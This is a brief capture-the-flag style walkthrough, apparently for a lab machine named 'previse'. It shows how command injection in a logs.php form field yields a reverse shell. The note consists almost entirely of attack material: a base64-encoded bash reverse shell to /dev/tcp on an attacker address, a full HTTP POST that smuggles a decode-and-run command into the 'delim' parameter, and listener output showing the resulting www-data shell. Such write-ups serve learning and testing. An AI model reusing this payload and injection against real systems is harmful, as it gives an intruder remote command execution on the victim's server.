# Rev Shell
Using the command injection in logs.php we can get a reverse shell

Payload creation:
```bash
> echo "bash -c  'bash -i >& /dev/tcp/10.10.14.4/9001  0>&1' " | base64 -w 0
YmFzaCAtYyAgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85MDAxICAwPiYxJyAK
```

Listen on port 9001 using ncat.

Trigger:

```bash
POST /logs.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 113
Origin: http://10.10.11.104
Connection: close
Referer: http://10.10.11.104/file_logs.php
Cookie: PHPSESSID=29j7ibhsojchid72tknestc125
Upgrade-Insecure-Requests: 1

delim=comma%3b+echo+"YmFzaCAtYyAgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNC85MDAxICAwPiYxJyAK"+|+base64+-d+|+bash
```

```bash
[patrick@redkite ~]$ nc -lnvp 9001
Connection from 10.10.11.104:59408
bash: cannot set terminal process group (1416): Inappropriate ioctl for device
bash: no job control in this shell
www-data@previse:/var/www/html$ 
```

Good to go.

